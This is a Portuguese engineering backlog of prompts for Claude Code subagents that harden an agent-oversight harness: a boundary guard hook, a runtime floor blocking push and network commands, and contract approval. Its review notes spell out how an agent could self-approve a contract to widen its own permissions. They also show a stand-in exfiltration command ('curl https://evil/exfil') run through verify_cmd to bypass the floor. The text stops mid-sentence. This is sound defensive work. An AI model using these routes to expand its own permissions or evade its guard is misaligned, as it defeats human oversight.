# BACKLOG DE EXECUÇÃO - CLAUDE CODE
# Correção de 5 pontos de fricção real do harness-creator, achados numa
# sessão de dogfood (relato do usuário, 2026-07-18) rodando o próprio
# harness sob contrato ativo.
#
# Origem: relato inline do usuário (não um outcomes-report formal) — os 5
# pontos foram mapeados por leitura de código nesta sessão de planejamento,
# com file:line confirmado antes de qualquer prompt ser escrito abaixo.
#
# Alvo de código: `src/harness/boundary_guard.py`, `src/harness/contract.py`,
# `src/harness/session_permissions.py`, `src/harness/cli.py`,
# `skills/plan/SKILL.md`. Testes: `tests/test_boundary_guard.py`,
# `tests/test_session_permissions.py`, `tests/test_contract.py`,
# `tests/test_cli.py`.
#
# Validação global ao fechar: `$env:PYTHONPATH = "src"; python -m pytest
# tests -q` 100% verde (a suíte deste repo roda inteira sem gate de env —
# não há `HARNESS_E2E_HEADLESS`/skipif em `tests/`) + o gate real do
# [SUBAGENTE 05] provando que `python -m harness.cli analyze` deixou de ser
# negado sob contrato ativo.
#
# ✅ Revisado por reflect (Claude Fable) contra o código real do repo. 5
# achados reais corrigidos diretamente nas decisões/blocos abaixo: (1) SUB03
# usava subprocess sem `shell=True` — falso "comando não encontrado" pra
# todo verify_cmd de shim .cmd no Windows (ex.: `ng`), justamente o cenário
# do relato; corrigido pra espelhar `verify.py:127-134`. (2) SUB03 não
# reconhecia que falha rápida é o estado ESPERADO de verify_cmd em tarefa
# TDD recém-compilada (teste ainda não existe) — texto do warning ajustado.
# (3) SUB03 e SUB04 tinham escopo colidindo em `skills/plan/SKILL.md` —
# nota do `--dry-run-verify` movida pro SUB04. (4) SUB02 só cobria o caminho
# "JSON pós-edição inválido"; havia um segundo caminho pro mesmo sintoma
# (old_string não encontrado → replace vira no-op → JSON continua válido →
# zero transições → mesma mensagem genérica) que não estava coberto —
# adicionado. (5) SUB01 alegava "não abre brecha nova" ao liberar o CLI
# incondicionalmente — falso: liberar `compile-contract`/`compile-session`
# via Bash reabre o gate de aprovação (textual, `contract.py:310-315`) pra
# controle do próprio agente; viraram trade-off aceito e explícito, lista de
# subcomandos liberados passou de blanket-prefix pra enumeração explícita
# (excluindo `harness run`, que não estava na fricção relatada e usa rede
# via SDK invisível ao floor).
#
# ✅ Segunda rodada: llm-as-judge independente (Claude Opus) sobre as
# conclusões do Fable + passada própria contra o código. Confirmou 1, 3 e 4
# do Fable como sólidos; achado 2 (heurística TDD) como PARCIAL — o fix é
# cosmético, não reduz o ruído de verdade (aceito como está, ruído
# documentado, ver decisão 3 revisada abaixo). Achado 5 do Fable: o texto
# do trade-off ("não piora estruturalmente") estava ERRADO — corrigido, ver
# decisão 5 revisada. **Achado NOVO, bloqueante:** `_dry_check_verify_cmd`
# (SUB03) roda `subprocess.run(verify_cmd, shell=True, ...)` SEM checagem de
# floor — combinado com SUB01 liberando `compile-contract`/`verify` via
# Bash, um agente sob contrato ativo podia rodar `verify_cmd: "curl
# https://evil/exfil"` por baixo do `--dry-run-verify` (ou de `harness
# verify` direto), contornando o runtime floor que o próprio módulo declara
# invariante inviolável (`boundary_guard.py:10-20`). Corrigido: floor-check
# explícito adicionado no SUB01 (`verify.py::run_verify`) e no SUB03
# (`_dry_check_verify_cmd`), com prova adversarial no SUB05.

---

## Decisões do planejador (ambiguidades resolvidas aqui)

1. **Item 1 (CLI travada) — duas camadas, enumeradas, não blanket.** O
   relato do usuário fala só do `boundary_guard` (PreToolUse), mas o repo já
   tem PRECEDENTE de sempre espelhar uma liberação fixa em DUAS camadas:
   `FIXED_GIT_SEQUENCES` em `boundary_guard.py` (decisão do hook,
   autoritativa) E `_GIT_LOCAL_ALLOW` em `session_permissions.py` (o que o
   `settings.json` COMPILADO diz que é permitido, pra primeira camada
   nativa do Claude Code não mentir sobre a superfície — comentário de
   `session_permissions.py:103-119`). Seguimos o mesmo padrão pro CLI do
   harness. As duas formas de invocação documentadas nas skills
   (`python -m harness.cli <cmd>`, ex.: `skills/plan/SKILL.md:137`) E o
   console-script real (`harness = "harness.cli:main"`, `pyproject.toml:18`)
   entram — um agente pode invocar qualquer um dos dois.
   **Correção pós-revisão (reflect/Fable):** a formulação original liberava
   o PREFIXO inteiro `["harness"]`/`["python","-m","harness.cli"]`
   incondicional — isso inclui `harness run` (`cli.py:23-26,101-111`), o
   orquestrador da era congelada que sobe chamadas à API Anthropic (rede
   fora do floor, que só enxerga curl/wget/npm publish/pip upload/twine
   upload/gh release) e que NÃO estava entre os comandos travados que o
   usuário citou. Trocamos por uma lista ENUMERADA dos subcomandos
   realmente necessários (`analyze`, `verify`, `compile-contract`,
   `compile-session`, `compile`, `audit`, `audit-runtime`, `audit-team`,
   `preflight`, `review`, `supervise`, `team`), deixando `run` de fora —
   mais cirúrgico e sem a superfície de rede oculta.
   **Trade-off aceito e registrado (não é bug, é escolha consciente —
   texto CORRIGIDO na revisão do llm-as-judge/Opus, a versão anterior
   minimizava o risco):** liberar `compile-contract`/`compile-session` via
   Bash sob contrato ativo dá ao agente uma capacidade NOVA, não uma via
   alternativa pra algo que ele já podia fazer. Hoje, sem esta mudança,
   `.harness/feature_list.json` é efetivamente imutável pelo agente — um
   `Write`/`Edit` direto nele que não seja uma transição `passes:true`
   gated por evidência cai em `_evaluate_feature_list_edit` → `None` →
   `_evaluate_file` → **deny** (fora da superfície). `compile-contract` é a
   ÚNICA via de reescrever esse arquivo, e é o arquivo que DEFINE a
   superfície de `Edit`/`Write`/`Bash` do agente. Com `.harness/work/**`
   sempre gravável (`boundary_guard.py:934-938`) + gate de aprovação
   textual (`contract.py:310-315`, confere só SE `approved_by`/`approved_at`
   estão preenchidos, não QUEM preencheu), liberar `compile-contract` via
   Bash dá ao agente um primitivo de **auto-expansão da própria superfície
   de edição**: autor um contrato → auto-aprova → compila → `feature_list.json`
   novo com `files` mais amplo que antes. O runtime floor (push/rede/segredo)
   continua sendo o freio do pior caso — e é justamente por isso que o
   floor-check adicionado no SUB01/SUB03 abaixo (achado do llm-as-judge) é
   BLOQUEANTE, não opcional: sem ele, o próprio mecanismo que este item
   libera (`compile-contract --dry-run-verify`, `harness verify`) seria uma
   via de bypass do floor. O fix estrutural real pro gate de aprovação
   textual (aprovação verificável por máquina, `approval_hash`) já está
   desenhado em `docs/roadmap-autonomous.md`, Fase 5 — fora de escopo aqui,
   só citado como onde esse gap se fecha de verdade; o que ESTE backlog
   garante é que a liberação não abra uma segunda porta (o floor) além da
   primeira (a superfície do contrato).
2. **Item 2 (mensagem enganosa) — dois caminhos pro mesmo sintoma, os dois
   cobertos.** Confirmado em código: `evaluate_feature_list_edit`
   (`boundary_guard.py:337-419`, cópia standalone espelhada em
   `_evaluate_feature_list_edit`, `boundary_guard.py:852-924`) faz
   `try: new_data = json.loads(proposed_text) / except JSONDecodeError|ValueError: return None`
   (linhas 369-372 / 876-879). Quando o `proposed_text` pós-Edit não é JSON
   válido, a função devolve `None` e `main()` (linha 1014-1022) cai pro
   `_evaluate_file` genérico, cuja mensagem (linha 960-963) não menciona
   feature-lock nem JSON inválido — ESSE é o caminho 1, coberto pelo fix
   original.
   **Achado da revisão (reflect/Fable):** existe um SEGUNDO caminho pro
   MESMO sintoma que a formulação original não cobria: se o `old_string` de
   um `Edit` combinado não bate literalmente com `current_text` (ex.:
   whitespace diferente ao editar 3 features de uma vez),
   `current_text.replace(old_string, new_string, 1)` (linhas 361-363/
   868-870) é um no-op silencioso — `proposed_text == current_text`, JSON
   continua VÁLIDO, zero transições detectadas, `return None` (linha 376) —
   mesma mensagem genérica, causa raiz diferente (edit que não encontrou o
   alvo, não JSON quebrado). Como não dá pra saber pelo transcript qual dos
   dois caminhos disparou no relato original, os DOIS entram no fix.
3. **Item 3 (verify_cmd não validado) — dry-check é ADVISORY, opt-in, nunca
   bloqueia compile.** Rejeitei duas alternativas mais agressivas:
   (a) parsear `--help` de cada `verify_cmd` — não pega o bug real do relato
   (`ng test --config=...` com flag inexistente: `--help` de muitas CLIs
   ignora o resto dos argumentos e não reproduz o erro de parse); (b) rodar
   o `verify_cmd` inteiro sempre no compile — caro, teria efeito colateral
   por padrão (roda teste de verdade numa hora que o usuário só queria
   compilar). Decisão: heurística de **fail-fast por timeout curto** — roda
   cada `verify_cmd` distinto com timeout baixo (8s); se o processo já
   TERMINOU com exit≠0 dentro da janela, é sinal de possível erro de
   parse/flag (o cenário real do relato); se ainda está rodando no timeout,
   mata o processo e considera são. **Opt-in via `--dry-run-verify`** (não é
   o comportamento padrão de `compile-contract`, pra não surpreender
   ninguém com um comando novo que às vezes dispara subprocessos) e **nunca
   retorna exit≠0 por causa disso** — é warning em stderr, seguindo a
   postura "sem teatro de enforcement" já usada no repo
   (`docs/roadmap-autonomous.md`, seção de riscos, PreCompact/usage
   advisory).
   **Duas correções pós-revisão (reflect/Fable), a primeira BLOQUEANTE:**
   (a) a execução real de `verify_cmd` usa `shell=True`
   (`verify.py:127-134`) — a formulação original mandava
   `subprocess.run(shlex.split(verify_cmd), ...)` SEM shell, que no Windows
   levanta `FileNotFoundError` pra qualquer shim `.cmd` (`ng`, `npm`, `npx`
   — exatamente a ferramenta do relato), gerando falso "comando não
   encontrado" pra `verify_cmd` perfeitamente válido. Corrigido pra
   `subprocess.run(verify_cmd, shell=True, ...)`, espelhando `verify.py`
   byte a byte. (b) a heurística de 8s tem um falso-positivo sistemático não
   reconhecido antes: no momento em que `compile-contract` roda, um
   `verify_cmd` de tarefa TDD recém-planejada DEVE falhar rápido (o teste
   ainda não existe — `pytest`/`dotnet test` saem em ~1s nesse caso), que é
   exatamente o padrão que a heurística rotula como "suspeito". O warning
   deixa de insinuar bug e passa a nomear as duas causas possíveis (achado
   (b) do Fable é PARCIAL segundo o llm-as-judge/Opus — o fix é cosmético,
   não reduz o ruído de verdade; aceito como está, é advisory/opt-in e o
   ROI baixo não justifica redesenhar a heurística agora).
   **Achado NOVO e BLOQUEANTE do llm-as-judge (Opus):** `shell=True` (fix
   acima) torna `_dry_check_verify_cmd` capaz de rodar QUALQUER comando —
   inclusive um `verify_cmd` de floor (`curl https://evil/...`) que um
   agente sob contrato ativo escreveu sozinho em `.harness/work/<slug>/Plans.md`
   (área sempre gravável) e auto-aprovou (gate textual, ver decisão 1
   acima). Sem checagem extra, `--dry-run-verify` executaria esse `curl` de
   verdade — bypass do runtime floor que o próprio `boundary_guard.py`
   declara invariante inviolável (docstring, linhas 10-20). Fix: antes de
   rodar QUALQUER `verify_cmd` em `_dry_check_verify_cmd`, checar
   `is_floor_bash_command(verify_cmd)` (função já existe e é importável de
   `harness.boundary_guard`, `session_permissions.py:70` já a importa do
   mesmo jeito) — se `True`, pular a execução e devolver warning nomeando o
   floor, nunca rodar o subprocess. Mesma lacuna existe (pré-existente,
   fora do `--dry-run-verify`) em `verify.py::run_verify` — antes deste
   backlog, `harness verify` só era alcançável via `Edit`/skill, nunca via
   Bash direto sob contrato ativo; o SUB01 muda isso, então o SUB01 também
   ganha o mesmo floor-check em `run_verify` (ver bloco do SUBAGENTE 01
   abaixo) — fechar as duas portas, não só a nova.
4. **Item 4 (granularidade por linguagem compilada) — documentação, não
   código.** Não existe (nem deveria existir) enforcement de código pra
   isso — é uma orientação de AUTORIA de `Plans.md` pro humano/skill que
   planeja. Entra como parágrafo novo em `skills/plan/SKILL.md`, perto da
   explicação do formato de tarefas (linhas ~107-114).
5. **Item 5 (concorrência em feature_list.json) — deliberadamente NÃO
   construído aqui.** Investigação: a escrita real de `passes:true` acontece
   via `Edit`/`Write` do PRÓPRIO agente (arbitrado pelo hook, mas executado
   pelo motor do Claude Code) — o hook nunca é dono do arquivo entre "avaliar"
   e "gravar" (TOCTOU inerente a hooks PreToolUse, não é algo que
   `boundary_guard.py` sozinho resolve com um lock). A solução estrutural
   correta já está desenhada em `docs/roadmap-autonomous.md`, Fase 6
   (`harness work`, sessão fria por feature, um agente por vez) — construir
   um lock bespoke agora seria descartável quando a Fase 6 chegar. Fix aqui:
   só documentação (`skills/plan/SKILL.md`) recomendando o workaround manual
   já validado pelo usuário (centralizar transições `passes:true` numa
   sessão orquestradora) enquanto a Fase 6 não existe, com link explícito
   pro roadmap. **Nenhum código novo neste item.**

## 🗺️ Mapa de Dependências dos Subagentes

- 🟢 [SUBAGENTE 01] — Item 1: CLI do harness liberada (`boundary_guard.py` +
  `session_permissions.py`) — independente, primeiro (desbloqueia dogfood
  dos itens seguintes)
- 🟡 [SUBAGENTE 02] (depende de 01 — MESMO arquivo `boundary_guard.py`) —
  Item 2: mensagem de JSON inválido no feature-lock
- 🟢 [SUBAGENTE 03] (paralelo a 01/02 — arquivo `contract.py`+`cli.py`
  diferente) — Item 3: dry-check advisory de `verify_cmd`
- 🟡 [SUBAGENTE 04] (depende de 03 — os dois tocam `skills/plan/SKILL.md`;
  04 inclui a nota do `--dry-run-verify` que antes colidia com 03) —
  Itens 4 e 5: notas de documentação
- 🏁 [SUBAGENTE 05] (depende de 01, 02, 03, 04) — Gate: suíte completa +
  prova real de dogfood dos itens 1-3

---

### [SUBAGENTE 01] - Item 1: liberar CLI do harness no boundary_guard + session_permissions

- **🎯 Objetivo:** Fazer os subcomandos enumerados de `python -m harness.cli`
  e `harness` (lista fechada — ver decisão 1; NÃO inclui `run`) pararem de
  ser negados pelo `boundary_guard` (Bash) quando há contrato ativo, e o
  `settings.json` compilado já refletir essa liberação — hoje `analyze`,
  `verify`, `compile-contract`, `compile-session`, `review`, `team`,
  `audit-team`, `supervise` só passam se coincidirem por acaso com
  `verify_cmd`/lint/build/install/git-local, e a ferramenta que GERA o
  contrato fica travada pelo próprio guard que ela gerou.
- **📂 Escopo de Arquivos:**
  - Ler: `src/harness/boundary_guard.py` (dentro de `render_boundary_guard()`:
    `FIXED_GIT_SEQUENCES` linhas 466-472, `_evaluate_bash` linhas 966-1005,
    especialmente a linha `allowed_sequences = FIXED_GIT_SEQUENCES + [...]`
    ~linha 987), `src/harness/session_permissions.py` (`_GIT_LOCAL_ALLOW`
    linhas 79-85, `render_session_permissions` linha 181
    `allow.extend(_GIT_LOCAL_ALLOW)`, docstring do módulo linhas 1-62 que
    documenta a superfície gerada), `pyproject.toml:18` (entrypoint
    `harness = "harness.cli:main"`), `skills/plan/SKILL.md:137` (forma
    `python -m harness.cli compile-contract ...` documentada),
    `src/harness/cli.py:23-96` (lista completa de subcomandos — `run` fica
    de fora da liberação, ver decisão 1 acima), `src/harness/verify.py:105-134`
    (`run_verify`, roda `verify_cmd` via `shell=True` SEM checagem de floor
    — hoje inofensivo porque `harness verify` não era alcançável via Bash
    sob contrato ativo; este subagente muda isso, então tem que fechar a
    lacuna que abre, ver achado do llm-as-judge na decisão 3)
  - Modificar: `src/harness/boundary_guard.py` (só dentro da string
    retornada por `render_boundary_guard()`), `src/harness/session_permissions.py`,
    `src/harness/verify.py` (floor-check em `run_verify`)
  - Testes: `tests/test_boundary_guard.py`, `tests/test_session_permissions.py`,
    `tests/test_verify.py`
- **🤖 Prompt para o Claude Code:**
  > "Claude, em `src/harness/boundary_guard.py`, dentro de `render_boundary_guard()`
  > (a string Python que vira o hook standalone instalado), logo depois do
  > bloco `FIXED_GIT_SEQUENCES = [...]` (linhas ~466-472), adicione:
  > ```python
  > # --- subcomandos do proprio harness sempre liberados quando ha contrato
  > # ativo: a ferramenta que GERENCIA o contrato nao pode ficar presa no
  > # guard que ela mesma gerou. Cobre as duas formas de invocacao
  > # documentadas nas skills (python -m harness.cli) e o console-script real
  > # (harness). NAO inclui 'run' (orquestrador da era congelada, chama a
  > # API Anthropic — rede fora do floor — e nao estava na fricao relatada).
  > _HARNESS_SUBCOMMANDS = [
  >     "compile", "audit", "audit-runtime", "analyze", "preflight",
  >     "compile-contract", "compile-session", "verify", "team", "review",
  >     "supervise", "audit-team",
  > ]
  > FIXED_HARNESS_SEQUENCES = (
  >     [["harness", sub] for sub in _HARNESS_SUBCOMMANDS]
  >     + [["python", "-m", "harness.cli", sub] for sub in _HARNESS_SUBCOMMANDS]
  > )
  > ```
  > Confira contra `src/harness/cli.py:23-96` que `_HARNESS_SUBCOMMANDS`
  > bate exatamente com os `add_parser(...)` existentes MENOS `run` — se
  > houver subcomando novo no `cli.py` que este prompt não listou, pare e
  > avise em vez de adivinhar.
  >
  > Depois, na função `_evaluate_bash` (linha ~987), mude
  > `allowed_sequences = FIXED_GIT_SEQUENCES + [_tokenize(c) for c in allowed_commands]`
  > para `allowed_sequences = FIXED_GIT_SEQUENCES + FIXED_HARNESS_SEQUENCES + [_tokenize(c) for c in allowed_commands]`.
  > NÃO toque no `FLOOR_BASH_SEQUENCES` nem na ordem de avaliação (o floor
  > continua rodando ANTES e bloqueia `git push`/rede mesmo colado com
  > `&&` a um comando `harness`).
  >
  > Em `src/harness/session_permissions.py`, adicione uma constante nova
  > logo após `_GIT_LOCAL_ALLOW` (linha ~85), com a MESMA lista de
  > subcomandos (copie `_HARNESS_SUBCOMMANDS` do `boundary_guard.py` pra não
  > divergir):
  > ```python
  > # Subcomandos do proprio harness: mesma liberacao do boundary_guard
  > # (FIXED_HARNESS_SEQUENCES), espelhada aqui pra settings.json nao mentir
  > # sobre a superficie (mesmo motivo do _GIT_LOCAL_ALLOW acima).
  > _HARNESS_SUBCOMMANDS = [
  >     "compile", "audit", "audit-runtime", "analyze", "preflight",
  >     "compile-contract", "compile-session", "verify", "team", "review",
  >     "supervise", "audit-team",
  > ]
  > _HARNESS_CLI_ALLOW: list[str] = (
  >     [f"Bash(harness {sub}*)" for sub in _HARNESS_SUBCOMMANDS]
  >     + [f"Bash(python -m harness.cli {sub}*)" for sub in _HARNESS_SUBCOMMANDS]
  > )
  > ```
  > e mude a linha `allow.extend(_GIT_LOCAL_ALLOW)` (~linha 181) para DUAS
  > linhas:
  > ```python
  > allow.extend(_GIT_LOCAL_ALLOW)
  > allow.extend(_HARNESS_CLI_ALLOW)
  > ```
  > (duas linhas, não `;` — ruff (E702) reprova múltiplos statements numa
  > linha). Depois do `_passes_runtime_floor_filter`, confirme mentalmente
  > que nenhuma entrada `Bash(harness <sub>*)` bate em
  > `is_floor_bash_command` (ela só olha `git push`/curl/wget/npm publish/pip
  > upload/twine upload/gh release — não bate). Atualize o docstring do
  > módulo (exemplo de saída, linhas ~46-61) acrescentando 1-2 entradas
  > novas de exemplo. Não mexa em `FIXED_GIT_SEQUENCES`,
  > `_collect_allowed_bash_commands`, nem inclua `run` em nenhuma das duas
  > listas.
  >
  > **Passo adicional OBRIGATÓRIO (fecha lacuna de segurança, não é
  > opcional):** liberar `harness verify`/`python -m harness.cli verify` via
  > Bash (acima) torna `run_verify` (`src/harness/verify.py:105-134`)
  > alcançável a partir de um Bash sob contrato ativo pela primeira vez —
  > antes, só era chamado internamente. `run_verify` roda
  > `subprocess.run(verify_cmd, shell=True, ...)` (linhas 127-134) sem
  > NENHUMA checagem de floor; um `verify_cmd` malicioso escrito pelo
  > próprio agente em `.harness/work/**` (sempre gravável) e compilado via
  > `compile-contract` correria de verdade, inclusive `curl`/`git push` —
  > bypass do runtime floor. Adicione, logo no início de `run_verify`
  > (antes do `subprocess.run`, depois de resolver `verify_cmd`/`verify_cwd`):
  > ```python
  > from harness.boundary_guard import is_floor_bash_command
  > ```
  > (import no topo do módulo, junto dos outros) e:
  > ```python
  > if is_floor_bash_command(verify_cmd):
  >     raise VerifyError(
  >         f"feature '{feature_id}': verify_cmd '{verify_cmd}' bate no "
  >         "runtime floor (push/rede/publicacao) — nunca executado, "
  >         "mesmo vindo de um contrato compilado"
  >     )
  > ```
  > Confirme que `boundary_guard.py` não importa nada de `verify.py`/`contract.py`
  > (checagem rápida de import circular — hoje não importa) antes de
  > adicionar o import."
- **🧪 Critério de Validação (DoD):**
  - [ ] `python -m ruff check src/harness/boundary_guard.py src/harness/session_permissions.py src/harness/verify.py` — limpo
  - [ ] `$env:PYTHONPATH = "src"; python -m pytest tests/test_boundary_guard.py tests/test_session_permissions.py tests/test_verify.py -q` — verde, sem regressão
  - [ ] Teste novo em `tests/test_verify.py`: feature com
        `verify_cmd: "curl https://example.com"` (ou qualquer comando do
        `FLOOR_BASH_SEQUENCES`) — `run_verify` levanta `VerifyError` citando
        "floor", e `subprocess.run` NUNCA é chamado (mock/spy com
        `assert_not_called()` — prova de que o processo de rede não sobe,
        não só que a exceção foi levantada)
  - [ ] Teste novo em `tests/test_boundary_guard.py` (seguir o padrão
        `_run_hook`/`install_boundary_guard`/`_write_feature_list` já
        existente no arquivo): com `feature_list.json` ativo (contrato
        qualquer) e SEM `verify_cmd` que case, `Bash("harness analyze --dir .")`
        e `Bash("python -m harness.cli compile-contract --dir . --slug x")`
        avaliam `"allow"`; `Bash("harness analyze && git push origin main")`
        continua avaliando `"deny"` (floor intocado); `Bash("harness run --dir .")`
        avalia `"deny"` (fora da lista enumerada — prova negativa de que
        `run` ficou de fora)
  - [ ] Teste novo em `tests/test_session_permissions.py`: `render_session_permissions`
        com `feature_list`/`profile` mínimos inclui `"Bash(harness analyze*)"`
        e `"Bash(python -m harness.cli verify*)"` no `allow` retornado, e
        NÃO inclui nenhuma entrada `"Bash(harness run*)"`
  - [ ] Prova manual real (PowerShell, fora de pytest): crie um diretório
        temporário com `.harness/feature_list.json` mínimo
        (`{"contract":"x","compiled_at":"now","features":[]}`), instale o
        hook (`python -c "from harness.boundary_guard import install_boundary_guard; install_boundary_guard('.')"`)
        e rode `'{"tool_name":"Bash","tool_input":{"command":"python -m harness.cli analyze --dir ."},"cwd":"."}' | python .harness\hooks\boundary_guard.py`
        — `permissionDecision` deve ser `"allow"`

---

### [SUBAGENTE 02] - Item 2: mensagem de JSON inválido no feature-lock (depende de 01)

- **🎯 Objetivo:** Cobrir os DOIS caminhos que hoje caem na mesma mensagem
  genérica "arquivo fora da superficie do contrato ativo" ao editar
  `feature_list.json`, quando a causa real é outra: (a) o `proposed_text`
  pós-edição não é JSON válido; (b) o `old_string` de um `Edit` não bate
  literalmente no `current_text` (comum em bloco combinado editando várias
  features de uma vez), o `replace()` vira no-op silencioso, e o JSON
  continua válido mas sem transição nenhuma detectada — mesmo sintoma,
  causa diferente (edit que não encontrou o alvo, não JSON quebrado).
- **📂 Escopo de Arquivos:**
  - Ler: `src/harness/boundary_guard.py` — `evaluate_feature_list_edit`
    (linhas 337-419, especialmente o `try/except json.JSONDecodeError` nas
    linhas 365-372), cópia standalone `_evaluate_feature_list_edit` (linhas
    852-924, `try/except ValueError` nas linhas 872-879 — o docstring do
    módulo, linhas 55-59, exige as duas cópias sincronizadas), `main()`
    (linhas 1008-1022, dispatcher que decide entre `_evaluate_feature_list_edit`
    e `_evaluate_file` genérico), `_evaluate_file` (linha 927+, mensagem
    genérica linhas 960-963)
  - Modificar: `src/harness/boundary_guard.py` (as DUAS funções, mantendo
    paridade byte-a-byte de comportamento como o docstring exige — só a
    sintaxe muda entre `json.JSONDecodeError`/`ValueError`, igual já é hoje)
  - Testes: `tests/test_boundary_guard.py`
- **🤖 Prompt para o Claude Code:**
  > "Claude, em `src/harness/boundary_guard.py`, em `evaluate_feature_list_edit`
  > (linha ~337), troque o bloco:
  > ```python
  > try:
  >     new_data = json.loads(proposed_text)
  > except json.JSONDecodeError:
  >     return None  # JSON proposto inválido — não dá pra avaliar transições, delega
  > ```
  > por:
  > ```python
  > try:
  >     new_data = json.loads(proposed_text)
  > except json.JSONDecodeError as exc:
  >     return "deny", (
  >         f"feature_list.json: edição proposta produz JSON inválido ({exc}) — "
  >         "edite uma feature por vez ou corrija a sintaxe antes de tentar de novo"
  >     )
  > ```
  > E, no branch do `Edit` (não `Write`) logo acima (linhas ~357-363), depois
  > de calcular `proposed_text`, adicione uma checagem ANTES do
  > `json.loads`: se `tool_name == "Edit"` e `old_string` (não vazio) NÃO
  > está contido em `current_text`, devolva direto
  > ```python
  > return "deny", (
  >     "feature_list.json: old_string do Edit não foi encontrado no "
  >     "arquivo atual — se está editando mais de uma feature no mesmo "
  >     "Edit, confira se o bloco bate exatamente com o conteúdo atual; "
  >     "edite uma feature por vez se não tiver certeza"
  > )
  > ```
  > sem chegar a rodar `replace()`/`json.loads` (esse é o segundo caminho pro
  > mesmo sintoma: `old_string` que não bate vira `replace()` no-op,
  > `proposed_text == current_text`, JSON continua válido, zero transições
  > detectadas, e o código caía no `return None` genérico igual ao caso de
  > JSON inválido — mesma mensagem enganosa, causa diferente).
  >
  > Atualize o docstring da função (linhas ~343-347): já não delega mais ao
  > genérico nem no caso de JSON inválido nem no caso de `old_string` não
  > encontrado — só delega quando o JSON é válido, o `old_string` foi
  > encontrado e aplicado, mas não há transição para `passes:true` nenhuma
  > (`transitioned` vazio, linha ~375-376, esse `return None` continua
  > igual).
  >
  > Espelhe EXATAMENTE as duas mudanças na cópia standalone
  > `_evaluate_feature_list_edit` (linha ~852, dentro da string de
  > `render_boundary_guard()`): mesma checagem de `old_string` não encontrado
  > (ASCII-only, sem acento) ANTES do `replace()`, e troque
  > ```python
  > try:
  >     new_data = json.loads(proposed_text)
  > except ValueError:
  >     return None
  > ```
  > por
  > ```python
  > try:
  >     new_data = json.loads(proposed_text)
  > except ValueError as exc:
  >     return "deny", (
  >         "feature_list.json: edicao proposta produz JSON invalido (" + str(exc) + ") - "
  >         "edite uma feature por vez ou corrija a sintaxe antes de tentar de novo"
  >     )
  > ```
  > (sem acento, seguindo a convenção ASCII-only já usada no resto da cópia
  > standalone). Não toque no `except json.JSONDecodeError`/`ValueError` do
  > PRIMEIRO try (parse de `current_text`/`old_data`, linhas ~365-368 e
  > ~872-875) — esse continua tolerante (`old_data = {}`), só o do
  > `new_data`/`proposed_text` muda. Não toque em `_transitions_to_true`,
  > `_evidence_freshness_problem`, `_evaluate_file`, nem em `main()`."
- **🧪 Critério de Validação (DoD):**
  - [ ] `python -m ruff check src/harness/boundary_guard.py` — limpo
  - [ ] `$env:PYTHONPATH = "src"; python -m pytest tests/test_boundary_guard.py -q` — verde
  - [ ] Teste novo: monta um `Edit` cujo `old_string`/`new_string` produz
        JSON quebrado (ex.: `old_string` fecha uma chave que `new_string`
        não reabre) contra um `feature_list.json` existente — resultado
        `("deny", <mensagem contendo "JSON invalido" ou "JSON inválido">)`,
        e a mensagem NÃO é igual à mensagem genérica de
        "arquivo fora da superficie do contrato ativo" (assert de
        desigualdade explícito, não só assert de deny)
  - [ ] Teste novo (segundo caminho): monta um `Edit` cujo `old_string` NÃO
        existe literalmente no `feature_list.json` atual (ex.: um espaço a
        mais) — resultado `("deny", <mensagem contendo "old_string" e "não
        foi encontrado"/"nao foi encontrado">)`, também desigual à mensagem
        genérica de superfície
  - [ ] Teste de não-regressão: o caso já coberto (transição sem evidência
        fresca → `"deny"` com "feature-lock: transicao... sem evidencia
        fresca") continua passando sem mudança de mensagem
  - [ ] Prova manual real (PowerShell): repita o cenário do relato original
        — `feature_list.json` com 3 features, um `Edit` combinado marcando
        as 3 `passes:true` num `old_string`/`new_string` que gera JSON
        inválido — confirme que a mensagem devolvida cita JSON, não
        "fora da superficie"

---

### [SUBAGENTE 03] - Item 3: dry-check advisory de `verify_cmd` no compile-contract

- **🎯 Objetivo:** `harness compile-contract --dry-run-verify` roda cada
  `verify_cmd` distinto do contrato com timeout curto e avisa (stderr,
  nunca bloqueia) quando um comando falha rápido — sinal de erro de
  parse/flag inválida (o cenário real do relato: `ng test
  --config=frontend/angular.json`, flag que não existe naquela versão do
  Angular CLI, só descoberto depois que um subagente rodou e falhou). **Com
  um invariante de segurança não-negociável: nunca executa um `verify_cmd`
  que bata no runtime floor** (achado do llm-as-judge/Opus — sem essa
  checagem, este dry-check seria uma via de bypass do floor sob contrato
  ativo).
- **📂 Escopo de Arquivos:**
  - Ler: `src/harness/contract.py` (`compile_contract`, linhas 292-352,
    especialmente o loop de `features` linhas 322-340 e a escrita final
    linhas 348-351), `src/harness/cli.py` (handler de `compile-contract`,
    linhas 167-181, e o bloco de `add_parser` linhas 49-51), `src/harness/verify.py:127-134`
    (`subprocess.run(verify_cmd, shell=True, ...)` — é ASSIM que o
    `verify_cmd` real é executado; o dry-check tem que espelhar exatamente
    essa chamada, ou vai dar falso "comando não encontrado" pra shims
    `.cmd` no Windows como `ng`/`npm`/`npx`), `src/harness/boundary_guard.py`
    (`is_floor_bash_command`, linha 132 — função pura, importável, é o MESMO
    critério de floor usado por `session_permissions.py:70`; reuse, não
    reimplemente)
  - Modificar: `src/harness/contract.py` (função nova
    `_dry_check_verify_cmd`, chamada opcional de `compile_contract`, imports
    novos de `subprocess`/`sys`/`is_floor_bash_command`), `src/harness/cli.py`
    (flag `--dry-run-verify`)
  - Testes: `tests/test_contract.py`, `tests/test_cli.py`
  - **NÃO tocar** `skills/plan/SKILL.md` neste subagente — a nota de uso do
    `--dry-run-verify` entra no [SUBAGENTE 04], que já mexe nesse arquivo
    (evita dois subagentes editando o mesmo arquivo em paralelo)
- **🤖 Prompt para o Claude Code:**
  > "Claude, em `src/harness/contract.py`, adicione uma função nova
  > `_dry_check_verify_cmd(verify_cmd: str, cwd: Path, timeout: float = 8.0) -> str | None`.
  > **Primeira linha da função, ANTES de qualquer subprocess** — checagem de
  > floor não-negociável:
  > ```python
  > if is_floor_bash_command(verify_cmd):
  >     return (
  >         f"verify_cmd '{verify_cmd}' bate no runtime floor "
  >         "(push/rede/publicacao) — dry-check NUNCA executa esse tipo de "
  >         "comando; se isso e inesperado, revise Plans.md"
  >     )
  > ```
  > (importe `from harness.boundary_guard import is_floor_bash_command` no
  > topo do módulo — reuse a MESMA função que `session_permissions.py:70`
  > já importa, não reimplemente a lista de floor aqui: duas cópias
  > divergem com o tempo). Só depois dessa checagem, roda
  > **`subprocess.run(verify_cmd, shell=True, cwd=cwd, capture_output=True,
  > text=True, timeout=timeout)`** — SEM `shlex.split`, `shell=True` com a
